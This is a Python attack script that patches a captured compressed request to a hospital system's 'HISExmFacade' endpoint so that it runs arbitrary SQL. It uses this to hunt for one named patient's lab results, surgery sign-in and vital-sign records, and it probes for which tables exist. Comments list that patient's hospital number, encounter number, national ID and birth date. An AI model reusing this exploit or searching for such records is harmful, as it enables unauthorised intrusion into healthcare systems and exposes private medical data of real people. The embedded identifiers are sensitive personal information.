from his_client_final import HISClient
import requests
import zlib

class LabSearcher5(HISClient):
    def execute_sql(self, sql):
        try:
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()
            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            target_len = len(original_sql_bytes)
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            padded_sql = sql.ljust(target_len)
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

searcher = LabSearcher5()

# Patient info from found_record.txt:
# HHISTNUM = 003617083J
# ENCNTNO = 75176986
# HIDNO = C221748019
# HBIRTHDT = 2007/04/05 (born 2007, so 18 years old)
# Surgery today: 2026-02-18

# The patient is 18 years old (born 2007-04-05), so they may have had previous visits.
# Let's search PAT_RESULTH by date range (last 2 years) to see if any records exist.

print("1. Searching PAT_RESULTH for any records with HHISTNUM-like IDs...")
# Try the HHISTNUM directly as PAT_ID
sql1 = "SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID = '003617083J'"
res1 = searcher.execute_sql(sql1)
if res1 and "<DRMODIFY>" in res1:
    print("[+] Found by HHISTNUM!")
    print(res1[:600])
else:
    print("[-] Not found by HHISTNUM.")

# 2. Try with HIDNO (National ID)
print("\n2. Searching PAT_RESULTH for HIDNO C221748019...")
sql2 = "SELECT * FROM OPDUSR.PAT_RESULTH WHERE PRH_PAT_ID = 'C221748019'"
res2 = searcher.execute_sql(sql2)
if res2 and "<DRMODIFY>" in res2:
    print("[+] Found by HIDNO!")
    print(res2[:600])
else:
    print("[-] Not found by HIDNO.")

# 3. Check if CPOE.OR_SIGN_IN has the ORDSEQ and links to lab
print("\n3. Checking CPOE.OR_SIGN_IN for ORDSEQ A75176986OR0041...")
sql3 = "SELECT * FROM CPOE.OR_SIGN_IN WHERE OR_ORDSEQ = 'A75176986OR0041'"
res3 = searcher.execute_sql(sql3)
if res3 and "<DRMODIFY>" in res3:
    print("[+] Found in CPOE.OR_SIGN_IN!")
    print(res3[:600])
else:
    print("[-] Not found in CPOE.OR_SIGN_IN.")

# 4. Try OPDUSR.VITALSIGNUPLOAD with ORDSEQ
print("\n4. Checking OPDUSR.VITALSIGNUPLOAD for ORDSEQ A75176986OR0041...")
sql4 = "SELECT * FROM OPDUSR.VITALSIGNUPLOAD WHERE ORDSEQ = 'A75176986OR0041'"
res4 = searcher.execute_sql(sql4)
if res4 and "<DRMODIFY>" in res4:
    print("[+] Found in VITALSIGNUPLOAD!")
    print(res4[:600])
else:
    print("[-] Not found in VITALSIGNUPLOAD.")

# 5. Check if there's a pre-op lab table in OPDUSR
print("\n5. Trying OPDUSR.PREOP_LAB or similar...")
for table in ['OPDUSR.PREOP_LAB', 'OPDUSR.PREOPLABRESULT', 'OPDUSR.LABRESULT']:
    sql = f"SELECT * FROM {table} WHERE ROWNUM <= 1"
    res = searcher.execute_sql(sql)
    if res and "<DRMODIFY>" in res:
        print(f"[+] Table {table} exists!")
        print(res[:400])
    else:
        print(f"[-] Table {table} not found.")
